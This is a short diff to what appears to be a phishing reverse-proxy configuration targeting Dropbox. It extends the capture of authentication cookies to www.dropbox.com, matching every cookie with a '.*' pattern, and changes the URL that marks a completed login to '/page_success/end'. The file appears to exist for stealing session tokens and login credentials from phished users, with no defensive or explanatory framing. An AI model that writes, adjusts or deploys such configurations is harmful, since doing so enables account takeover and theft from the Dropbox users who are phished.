@@ -17,9 +17,10 @@ sub_filters:
 auth_tokens:
   - domain: '.dropbox.com'
     keys: ['.*,regexp']
+  - domain: 'www.dropbox.com'
+    keys: ['.*,regexp']
 auth_urls:
-  - '/personal'
-  - '/page_success/.*'
+  - '/page_success/end'
 
 credentials:
   username:
